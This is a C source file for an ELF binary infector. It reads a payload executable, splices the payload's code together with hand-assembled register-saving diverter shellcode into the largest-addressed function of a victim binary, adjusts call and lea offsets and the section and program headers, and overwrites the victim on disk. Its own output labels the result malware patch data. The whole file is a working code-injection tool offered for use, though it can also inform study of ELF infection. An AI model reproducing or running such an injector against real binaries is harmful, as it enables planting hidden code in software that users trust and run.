#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <elf.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>

struct elf_file{
	char *fileName;
        char *stringTable;
	int fd;
	int err;
	size_t symTabLen;
	size_t relsLen;
	size_t relasLen;
        struct stat st;
        uint8_t *mem;
	Elf64_Addr entryAddr;
        Elf64_Ehdr *ehdr;
        Elf64_Phdr *phdr;
        Elf64_Shdr *shdr;
	Elf64_Shdr shdrText;
	Elf64_Shdr shdrSymtab;
	Elf64_Sym *symTab;
	Elf64_Rel *rels;
	Elf64_Rela *relas;
};

Elf64_Shdr getShdrByName(struct elf_file src, const char *target){
	Elf64_Shdr ret;
	for(int i=0; i<src.ehdr->e_shnum; i++){
		if(!strcmp(&src.stringTable[src.shdr[i].sh_name], target)){
			return src.shdr[i];
		}
	}
	return src.shdr[0];
}
int getShdrIdByName(struct elf_file src, const char *target){
	Elf64_Shdr ret;
        for(int i=0; i<src.ehdr->e_shnum; i++){
                if(!strcmp(&src.stringTable[src.shdr[i].sh_name], target)){
                        return i;
                }
        }
        return 0;
}
char *getSymbolString(struct elf_file src, int index){
	return (char *)&src.mem[src.shdrSymtab.sh_offset+src.shdrSymtab.sh_size+src.symTab[index].st_name];;
}
const char *getSymbolInfoString(struct elf_file src, int index){
	switch(ELF64_ST_TYPE(src.symTab[index].st_info)){
		case STT_NOTYPE:
			return "STT_NOTYPE";
		case STT_OBJECT:
			return "STT_OBJECT";
		case STT_FUNC:
			return "STT_FUNC";
		case STT_SECTION:
			return "STT_SECTION";
		case STT_FILE:
			return "STT_FILE";
		default:
			printf("Debug st_info : %d\n", src.symTab[index].st_info);
			return "unknown";
	}
}
struct elf_file getSymbolsForSection(struct elf_file src, const char *section){
        src.shdrSymtab = getShdrByName(src, section);
        if(src.shdrSymtab.sh_type != SHT_SYMTAB){
		src.symTabLen = 0;
                return src;
        }
        src.symTab = (Elf64_Sym *)&src.mem[src.shdrSymtab.sh_offset];
	src.symTabLen = src.shdrSymtab.sh_size/src.shdrSymtab.sh_entsize;
        return src;
}

struct elf_file getRelsForSection(struct elf_file src, const char *section){
        src.shdrSymtab = getShdrByName(src, section);
        if(src.shdrSymtab.sh_type != SHT_REL){
                src.symTabLen = 0;
                return src;
        }
        src.symTab = (Elf64_Sym *)&src.mem[src.shdrSymtab.sh_offset];
        src.symTabLen = src.shdrSymtab.sh_size/src.shdrSymtab.sh_entsize;
        return src;
}

struct elf_file initElfFile(const char *file){
	struct elf_file ret = {
		.err = 0
	};
	ret.fileName = (char *)file;
	if((ret.fd = open(file, O_RDWR)) < 0){
                perror("open");
                ret.err = 1;
		return ret;
        }

        if(fstat(ret.fd, &ret.st) < 0){
                perror("fstat");
                close(ret.fd);
                ret.err = 1;
        }

	ret.mem = mmap(NULL, ret.st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, ret.fd, 0);
	if(ret.mem == MAP_FAILED){
                perror("mmap");
                close(ret.fd);
                ret.err = 1;
        }

        ret.ehdr = (Elf64_Ehdr *)ret.mem;
        ret.phdr = (Elf64_Phdr *)&ret.mem[ret.ehdr->e_phoff];
        ret.shdr = (Elf64_Shdr *)&ret.mem[ret.ehdr->e_shoff];

        if(ret.mem[0] != 0x7f && strcmp(&ret.mem[1], "ELF")){
                printf("%s isn't an elf binary file.\n", file);
                ret.err = 1;
		return ret;
        }

        ret.stringTable = &ret.mem[ret.shdr[ret.ehdr->e_shstrndx].sh_offset];
	ret.entryAddr = ret.ehdr->e_entry;
	ret.shdrText = getShdrByName(ret, ".text");
	ret = getSymbolsForSection(ret, ".symtab");
	return ret;
}

void enumerateSections(struct elf_file src){
	for(int i=1; i<src.ehdr->e_shnum; i++){
                printf("%s: 0x%lx\n", &src.stringTable[src.shdr[i].sh_name], src.shdr[i].sh_addr);
        }
}


void updateEntryAddress(struct elf_file src, Elf64_Addr val){
	src.ehdr->e_entry = val;
	//src.mem = (unsigned char *)src.ehdr;
}

/*
 * Flow control code
 * */
size_t diverterCodeSize = 53;
uint8_t diverterCode[53] = {
	0x50,                  			  // push   %rax
	0x53,                   		  // push   %rbx
	0x51,                   		  // push   %rcx
	0x52,                   		  // push   %rdx
	0x56,                   		  // push   %rsi
	0x55,                   		  // push   %rbp
	0x41, 0x50,                		  // push   %r8
	0x41, 0x51,                		  // push   %r9
	0x41, 0x52,                		  // push   %r10
	0x41, 0x53,                		  // push   %r11
	0x41, 0x54,                		  // push   %r12
	0x41, 0x55,                		  // push   %r13
	0x41, 0x56,                		  // push   %r14
	0x41, 0x57,                		  // push   %r15
	0x48, 0x8d, 0x05, 0x72, 0x00, 0x00, 0x00, // lea    0x72(%rip),%rax  # 0x72 gets updated with the offset to the payload code.
	0xff, 0xd0,                		  // call   *%rax
	0x41, 0x5f,                		  // pop    %r15
	0x41, 0x5e,                		  // pop    %r14
	0x41, 0x5d,                		  // pop    %r13
	0x41, 0x5c,                		  // pop    %r12
	0x41, 0x5b,                		  // pop    %r11
	0x41, 0x5a,                		  // pop    %r10
	0x41, 0x59,                		  // pop    %r9
	0x41, 0x58,                		  // pop    %r8
	0x5d,                   		  // pop    %rbp
	0x5e,                   		  // pop    %rsi
	0x5a,                   		  // pop    %rdx
	0x59,                   		  // pop    %rcx
	0x5b,                   		  // pop    %rbx
	0x58                   			  // pop    %rax
};

size_t cleanExitCodeLen = 16;
uint8_t cleanExitCode[16] = {
	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 	// mov    $0x3c,%rax
	0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, 	// mov    $0x0,%rdi
   	0x0f, 0x05                			// syscall ; invoke sys_exit 
};

int main(int argc, char *argv[]){
	if(argc < 3){
		printf("Usage : %s [payload binary] [victim binary]\n", argv[0]);
		return 1;
	}
	printf("[*] Injecting %s into %s\n", argv[1], argv[2]);
	struct elf_file payload = initElfFile(argv[1]);
	struct elf_file victim = initElfFile(argv[2]);
	if(payload.err || victim.err){
		printf("Failed to init elf files.\n");
		return 1;
	}
	
	/*
	 * Prepare Victim Elf File.
	 * */
	printf("[*] Victim Entry Address : 0x%lx\n", victim.entryAddr);
	char *victimEntry;
	Elf64_Sym targetFunction;
	Elf64_Addr grabber = 0;
	int tracker = 0;
	for(int i=0; i<victim.symTabLen; i++){
		if(victim.symTab[i].st_size > 0 && ELF64_ST_TYPE(victim.symTab[i].st_info) == STT_FUNC){
			if(victim.symTab[i].st_value > grabber){
				grabber = victim.symTab[i].st_value;
				victimEntry = getSymbolString(victim, i);
				targetFunction = victim.symTab[i];
				tracker = i;
			}
		}
	}
	
	printf("[*] The following victim function has been selected for injection: \n");
	printf("\t[0x%lx] %s()\n", targetFunction.st_value, victimEntry);
        printf("\tInfo : %s\n", getSymbolInfoString(victim, tracker));
        printf("\tOther : %c\n", targetFunction.st_other);
        printf("\tShndx : %d\n", targetFunction.st_shndx);
        printf("\tSize : %ld\n", targetFunction.st_size);
	uint8_t *victimDstBuf = NULL;
       	size_t victimDstBufLen= targetFunction.st_size;
	victimDstBuf = malloc(victimDstBufLen);
	for(int i=targetFunction.st_value,_i=0; i<targetFunction.st_value+targetFunction.st_size; i++,_i++)
		victimDstBuf[_i] = victim.mem[i];
	
	/*
	 * Prepare Payload Elf File.
	 * */
	printf("[*] Payload Entry Address : 0x%lx\n", payload.entryAddr);
	printf("[*] Injecting the following payload functions:\n");
	for(int i=0; i<payload.symTabLen; i++){
		if(payload.symTab[i].st_size > 0 && ELF64_ST_TYPE(payload.symTab[i].st_info) == STT_FUNC)
			printf("\t[0x%lx] %s()\n", payload.symTab[i].st_value, getSymbolString(payload, i));
	}
	uint8_t *payloadSrcBuf = NULL;
	size_t payloadSrcBufLen = payload.shdrText.sh_size;
	printf("[*] Payload Size : %ld\n", payloadSrcBufLen);
	payloadSrcBuf = malloc(payloadSrcBufLen);
	for(int i=payload.shdrText.sh_offset,_i=0; i<payload.shdrText.sh_offset+payload.shdrText.sh_size; i++, _i++)
		payloadSrcBuf[_i] = payload.mem[i];


	/*
	 * Allocate the buffer that will hold the infected section.
	 * */
	int modifyer = 0;
	size_t injectedBufLen = diverterCodeSize + payloadSrcBufLen + victimDstBufLen + cleanExitCodeLen;
	uint8_t *injectedBuf = NULL;
	if(victimDstBuf[victimDstBufLen-2] == 0xc9 && victimDstBuf[victimDstBufLen-1] == 0xc3){
		modifyer = 2;
	}else if(victimDstBuf[victimDstBufLen-1] == 0xc3){
		modifyer = 1;
	}
	//victimDstBuf -= modifyer;
	//injectedBufLen -= modifyer;
	injectedBuf = malloc(injectedBufLen);

	/*
	 * Craft the infected section for 5000 XP points.
	 * */
	int usedDiverterBytes = 29;	
	uint32_t payloadOffset = ((diverterCodeSize-usedDiverterBytes) + victimDstBufLen + (cleanExitCodeLen))-modifyer;
        uint8_t *_payloadOffset = (uint8_t *)&payloadOffset;
	diverterCode[25] = _payloadOffset[0];
	diverterCode[25+1] = _payloadOffset[1];
	diverterCode[25+2] = _payloadOffset[2];
	diverterCode[25+3] = _payloadOffset[3];
        printf("[*] Updated Divert Code Jump : 0x%x\n", payloadOffset);

	int tmp_i = 0;
	int tmp = diverterCodeSize;
	for(int i=tmp_i; i<tmp; i++){
		injectedBuf[i] = diverterCode[i];
	}
	tmp_i += diverterCodeSize;
	tmp += victimDstBufLen;
	for(int i=tmp_i, _i=0; i<tmp; i++,_i++){
		injectedBuf[i] = victimDstBuf[_i];
	}
	tmp_i += victimDstBufLen-modifyer;
	tmp += cleanExitCodeLen - modifyer;
	for(int i=tmp_i, _i=0; i<tmp; i++, _i++){
		injectedBuf[i] = cleanExitCode[_i];
	}

	tmp_i += cleanExitCodeLen;
	tmp += payloadSrcBufLen;
	for(int i=tmp_i, _i=0; i<tmp; i++,_i++){
		injectedBuf[i] = payloadSrcBuf[_i];
	}
	printf("[*] Malware patch data generated (%ld bytes)\n", injectedBufLen);


	/*
	 * Prep variables for updating the target binary file.
	 * */
	size_t newMemorySize = victim.st.st_size + (injectedBufLen-victimDstBufLen);
	int difference = (newMemorySize - victim.st.st_size);
	uint8_t *newMemory = NULL;
	

	/*
	 * Patch invocations of the call instruction to reflect the new .got offset
	 * */
	uint8_t callInst = 0xe8;
	for(int i=diverterCodeSize; i<diverterCodeSize+victimDstBufLen; i++){
                if(injectedBuf[i] == callInst){
                        uint8_t vals[4] = {injectedBuf[i+1], injectedBuf[i+2], injectedBuf[i+3], injectedBuf[i+4]};
                        uint32_t *val_32 = (uint32_t*)&vals;
                        val_32[0] -= diverterCodeSize;
                        uint8_t *valRet = (uint8_t *)&val_32[0];
                        injectedBuf[i+1] = valRet[0];
                        injectedBuf[i+2] = valRet[1];
                        injectedBuf[i+3] = valRet[2];
                        injectedBuf[i+4] = valRet[3];
                        i+=4;
                }
        }
	
	/*
	 * Patch invocations of the lea instruction to reflect the new .rodata offset.
	 * */
	uint8_t leaInst[3] = {0x48, 0x8d, 0x05};
	for(int i=diverterCodeSize; i<diverterCodeSize+victimDstBufLen; i++){
		if(injectedBuf[i] == leaInst[0] && injectedBuf[i+1] == leaInst[1] && injectedBuf[i+2] == leaInst[2]){
			uint8_t vals[4] = {injectedBuf[i+3], injectedBuf[i+4], injectedBuf[i+5], injectedBuf[i+6]};
			uint32_t *val_32 = (uint32_t*)&vals;

			val_32[0] += difference-diverterCodeSize;
			printf("[*] Adjusted LEA address to 0x%x\n", val_32[0]);
			
			uint8_t *valRet = (uint8_t *)&val_32[0];
			printf("\t%x %x %x %x\n", valRet[0], valRet[1], valRet[2], valRet[3]);
			injectedBuf[i+3] = valRet[0];
			injectedBuf[i+4] = valRet[1];
			injectedBuf[i+5] = valRet[2];
			injectedBuf[i+6] = valRet[3];
			i+=6;
		}
	}


	/*
	 * Update the target elf file's fields to reflect our size changes.
	 * */
	victim.symTab[tracker].st_size = injectedBufLen;
	victim.shdr[getShdrIdByName(victim, ".text")].sh_size += (injectedBufLen-victimDstBufLen);

	if(victim.ehdr->e_shoff > targetFunction.st_value){
                victim.ehdr->e_shoff += (newMemorySize - victim.st.st_size);
        }
	for(int i=0; i<victim.ehdr->e_phnum; i++){
                if(victim.phdr[i].p_offset > targetFunction.st_value){
                        victim.phdr[i].p_offset += difference;
                }

                if(victim.phdr[i].p_vaddr > targetFunction.st_value){
                        victim.phdr[i].p_vaddr += difference;
                }
		if(victim.phdr[i].p_paddr > targetFunction.st_value){
                        victim.phdr[i].p_paddr += difference;
                }
        }
	for(int i=0; i<victim.ehdr->e_shnum; i++){
                if(victim.shdr[i].sh_offset > targetFunction.st_value){
                        victim.shdr[i].sh_offset += difference;
                }

                if(victim.shdr[i].sh_addr > targetFunction.st_value){
                       	victim.shdr[i].sh_addr += difference;
                }
        }
	printf("[*] Elf Sections Realigned.\n");

	/*
	 * Apply all changes to the file.
	 * */
	newMemory = malloc(newMemorySize);
	for(int i=0; i<targetFunction.st_value; i++){
		newMemory[i] = victim.mem[i];
	}
	for(int i=targetFunction.st_value, _i=0; i<targetFunction.st_value+injectedBufLen; i++, _i++){
		newMemory[i] = injectedBuf[_i];
	}
	for(int i=targetFunction.st_value+injectedBufLen, _i=targetFunction.st_value+targetFunction.st_size; i<newMemorySize; i++, _i++){
		newMemory[i] = victim.mem[_i];
	}
	
	close(victim.fd);
	victim.fd = open(argv[2], O_WRONLY | O_TRUNC);
	if(victim.fd<0){
		perror("open");
		return 1;
	}
	if(write(victim.fd, newMemory, newMemorySize) <= 0){
		perror("write");
		return 1;
	}
	
	printf("[*] %s has been patched.\n", argv[2]);
	return 0;
}
